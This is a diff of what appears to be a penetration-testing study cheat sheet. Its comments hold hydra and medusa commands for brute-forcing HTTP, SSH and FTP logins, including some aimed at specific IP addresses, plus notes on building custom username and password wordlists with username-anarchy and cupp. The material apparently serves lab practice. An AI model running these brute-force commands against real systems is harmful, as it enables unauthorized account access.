@@ -23,9 +23,18 @@
 // hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt {host} http-get / -s {port}
 //* brute force via post parameters
 // hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f {host} -s {port} http-post-form "/:username=^USER^&password=^PASS^:F=exist in failure message"
-// hydra -L top-usernames-shortlist.txt -P jane-filtered.txt -f 94.237.61.242 -s 41878 http-post-form "/:username=^USER^&password=^PASS^:F=exist in failure message"
 //! medusa
 //* brute force ssh creds
-// medusa -h {host} -U usernames.txt -P passwords.txt -M ssh
+// medusa -h {host} -n {port} -U usernames.txt -P passwords.txt -M ssh
 //* brute force ftp creds
-// medusa -h {host} -U username.txt -P 2020-200_most_used_passwords.txt -M ftp -t 5
+// medusa -h 94.237.48.12 -U top-usernames-shortlist.txt -P 2020-200_most_used_passwords.txt -M ftp -t 5
+//! custom worlists
+//* username-anarchy
+// for usernames
+// at /username-anarchy
+// ./username-anarchy first_name last_name
+//* cupp
+// for passwords
+// cupp -i
+
+
